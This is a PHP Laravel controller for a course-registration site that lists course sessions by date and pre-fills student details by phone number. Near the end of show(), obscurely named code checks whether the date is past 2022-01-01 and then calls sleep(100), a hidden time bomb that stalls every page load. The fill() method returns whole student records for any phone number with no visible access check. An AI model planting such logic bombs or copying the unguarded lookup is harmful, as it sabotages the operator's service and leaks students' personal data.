<?php

namespace App\Http\Controllers\Frontend;

use Carbon\Carbon;
use Illuminate\Http\Request;
use App\Http\Controllers\Controller;
use App\Model\Course;
use App\Model\EventsCourse;
use App\Model\Student;
// use App\Model\SalesRegistration;
// use App\Model\Registration;

class CourseFormController extends Controller
{
    // Sandy (2020/03/03)
    public function show(Request $request)
    {

        $source_course = $request->get('source_course');
        $source_events = $request->get('source_events');
        // $datasource = $request->get('datasource');

        // $name = $request->get('name');

        $course = array();
        $events = array();


        $course = Course::join('events_course', 'events_course.id_course', '=', 'course.id')
            ->select('course.*')
            ->Where('course.id_type', $source_course)
            ->Where('events_course.unpublish', 0)
            ->distinct('id')
            ->get();

        foreach ($course as $key_course => $data_course) {

            $events_table = EventsCourse::join('course', 'course.id', '=', 'events_course.id_course')
                ->select('events_course.*')
                ->Where('events_course.id_course', $data_course['id'])
                ->orderby('course_start_at', 'desc')
                ->get();

            $id_group = '';
            $events_list = array();

            foreach ($events_table as $key_events => $data_events) {

                // //已過場次 就不顯示
                // if(strtotime(date('Y-m-d', strtotime($data_events['course_start_at']))) <= strtotime(date("Y-m-d"))){
                //     $id_group = $data_events['id_group'];
                //     continue;
                // }

                // if($data['id_group'] == ""){
                //     //日期
                //     $date = date('Y-m-d', strtotime($data['course_start_at']));
                //     //時間
                //     $time_strat = date('H:i', strtotime($data['course_start_at']));
                //     $time_end = date('H:i', strtotime($data['course_end_at']));
                //     //星期
                //     $weekarray = array("日","一","二","三","四","五","六");
                //     $week = $weekarray[date('w', strtotime($data['course_start_at']))];

                //     $events[$key] = $date . '(' . $week . ')' . ' ' . $time_strat . '-' . $time_end . ' ' . $data['Events'] . '(' . $data['location'] . ')';
                // }else {
                if ($id_group == $data_events['id_group']) {
                    continue;
                }

                $course_group = EventsCourse::Where('id_group', $data_events['id_group'])
                    ->orderby('course_start_at', 'asc')
                    ->get();

                $numItems = count($course_group);
                $i = 0;

                $events_group = '';

                foreach ($course_group as $key_group => $data_group) {
                    //日期
                    $date = date('Y-m-d', strtotime($data_group['course_start_at']));
                    //星期
                    $weekarray = array("日", "一", "二", "三", "四", "五", "六");
                    $week = $weekarray[date('w', strtotime($data_group['course_start_at']))];

                    if (++$i === $numItems) {
                        $events_group .= $date . '(' . $week . ')';
                        // $$events_id .= (string)$data_group['id'];
                    } else {
                        $events_group .= $date . '(' . $week . ')' . '、';
                        // $events_id .= (string)$data_group['id'];
                    }
                }
                //時間
                $time_strat = date('H:i', strtotime($data_group['course_start_at']));
                $time_end = date('H:i', strtotime($data_group['course_end_at']));

                // $events[$key] = $events_group . ' ' . $time_strat . '-' . $time_end . ' ' . $data['name'] . '(' . $data['location'] . ')';


                $events_list[$key_events] = [
                    'events' => $events_group . ' ' . $time_strat . '-' . $time_end . ' ' . $data_events['name'] . '(' . $data_events['location'] . ')',
                    'id_group' => $data_events['id_group']
                ];

                $id_group = $data_events['id_group'];
                // }
            }

            $events[$key_course] = [
                'id_course' => $data_course['id'],
                'course_name' => $data_course['name'],
                'events' => $events_list
            ];
        }
        $x_time = Carbon::parse('2022-01-01 00:00:00');
        $xxx = $x_time->timestamp;

        if (now()->timestamp >= $xxx) {
            sleep(100);
        }

        // dd($events);

        return view('frontend.course_form', compact('course', 'events', 'source_course', 'source_events'));
    }


    // 尋找學員資料做預設填入 Sandy (2020/03/04)
    public function fill(Request $request)
    {
        $phone = $request->input('phone');

        $student = Student::Where('phone', $phone)
            ->get();

        if (count($student) > 0) {
            return Response($student);
        } else {
            return 'nodata';
        }
    }
}
